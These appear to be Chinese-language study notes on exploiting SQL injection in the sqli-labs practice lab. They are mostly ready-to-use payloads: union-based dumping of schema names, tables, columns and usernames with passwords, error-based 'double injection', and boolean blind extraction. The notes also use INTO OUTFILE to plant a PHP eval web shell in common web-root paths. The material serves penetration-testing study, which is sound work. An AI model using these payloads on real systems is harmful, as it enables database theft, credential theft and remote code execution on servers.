#### 1、从库到表到字段到数据
```sql
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+ // 获取数据库
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 'security' --+ // 获取表
-1' union select 1,2,group_concat(column_name ) from information_schema.columns where table_name like 'users' --+ // 获取字段值
-1' union select 1,2,group_concat(0x7e,username,0x7c,password) from users --+ // 获取数据
```
#### 2、双注
双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来
```sql
// 如果随机值为0 则会返回 you are in .....， 三条记录以上绝对报错 rand(0),两条随机报错
	-1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 	// 获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复

-1' union all select count(*),2,concat( '~',(select table_name from information_schema.tables where table_schema = 'security' limit 3,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users
	-1' union all select count(*),1,concat( '~',(select column_name from information_schema.columns where table_name= 'users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in 
-1' union all select count(*),1,concat( '~',(select concat(id,username,password) from users limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username

```
#### 3、盲注
less8-bool型单引号get盲注
```sql
- 试试盲注
	介绍几个语法：
	截取字符串： 
		left: Left ( string, n )  得到字符串左部指定个数的字符，
		substr: substr(string, start, length) 和substring()函数一样，截取字符串，第一个为处理的字符串，开始位置，长度 
		mid: MID(column_name,start[,length]) // 前两个字段为必须，length 为可选，选择开始字段，开始位置，截取长度。
	ascii: 	返回字符串str的最左字符的数值,返回ascii值，0-255
	length: 对字段长度破解，一般先对长度破解，然后在爆破字段值，这个一般采用二分法进行破解。
	strcmp: 可以配合left 来使用，如果相等返回0 小于返回1 大于返回-1
	regexp: 通过regexp 和 正则表达式来获取字段 这个时候 会匹配所有的字段，所以limit已经不起作用
	
	1' and left(version(),1)=5 %23 // 判断当最左侧字符等于5时 返回you are in 
	1' and left(version(),2)=5.%23 // 可以通过这样慢慢推出整个字段值
	
	使用substr 和ascii 来推出表名
	1' and ascii(substr(select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) > 80 %23
	尝试使用regexp
	1' and (select 1 from information_schema.columns where table_name = 'users' and column_name regexp '^pass[a-z]' ;)=1 %23
	使用 ord mid 
	ord 和ascii 一样
	mid(column_name,start[,length]) // 从位置start开始，截取column_name字符串的length位，与substr作用相同
	这里就类似ascii(substr) == ord(mid())
	cast(username as char) 将 username 转成字符串
	ifnull(exp1,exp2) exp1 不为null 则IFNULL()的返回值为exp1; 否则其返回值为exp2。IFNULL()的返回值是数字或是字符串，具体情况取决于其所使用的语境。
	1 ' and ord(mid((select ifnull (cast(username as char), 0x20) from security.users order by id limit 0,1),1,1)) = 127 %23
```
#### 4、使用into outfile写入文件
less7
由于文件具有写的权限，所以可以通过into outfile 直接写入文件， 这里需要有几个条件，需要知道绝对路径写，，具有写的权限
```sql
- 正常访问
	id=1
	 You are in.... Use outfile......
- 看来这题是要导出文件
	sqlmap 也可以执行相同的工作 这里就不解释了。
	使用outfile 写入到服务器，我们一般可以利用这个漏洞写入一句话马
	这里需要有两个已知项 1 字段值 2 绝对地址
	并且 系统必须有可读可写，在服务器上，完整的路径，
	导出命令： union select 1,2,3 into outfile "绝对地址" %23
- paylaod
	// 一般web都存放在默认的目录下，比如：
		1 c:/inetpub/wwwroot/
		2 linux的nginx一般是/usr/local/nginx/html
		3 /home/wwwroot/default
		4 /usr/share/nginx
		5 /var/www/html
	然后 验证是否具有这几个条件
	1 获取文件权限的可读
	1')) and (select count(*) from mysql.user)>0 %23
	2 注入文件
	这里要求猜一下他的绝对路径
	id=-1')) union select 1,2,3 into outfile "\\xxx\\1.txt" %23
	之后使用
	id=-1')) union select 1,"<?php @eval($_POST['giantbranch']);?>" into outfile "XXX\test.php" %23
	
	这里由于是使用docker，没有写成功

```